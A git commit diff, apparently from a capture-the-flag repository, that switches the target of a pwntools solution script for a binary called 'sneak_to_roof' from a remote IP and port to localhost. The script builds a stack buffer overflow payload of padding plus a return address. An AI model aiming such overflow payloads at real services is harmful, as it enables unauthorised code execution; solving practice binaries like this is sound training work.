b2b81f3ae8e9411eb0b7814a844772bb0a4849e6
DaKeiser <rithwiksaim@gmail.com>
2020-06-17 20:59:00 +0530

    Changed Ports and docker stuff

--- bin/bin3/solution2.py
+++ bin/bin3/solution2.py
@@ -1,7 +1,7 @@
 from pwn import *
 
 #r = process('./sneak_to_roof')
-r = remote('157.245.96.220',6717)
+r = remote('localhost',6703)
 
 payload = b'A'*0x80 + b'A'*8 + p64(0x00000000004006ad);
 r.sendline("dummy")
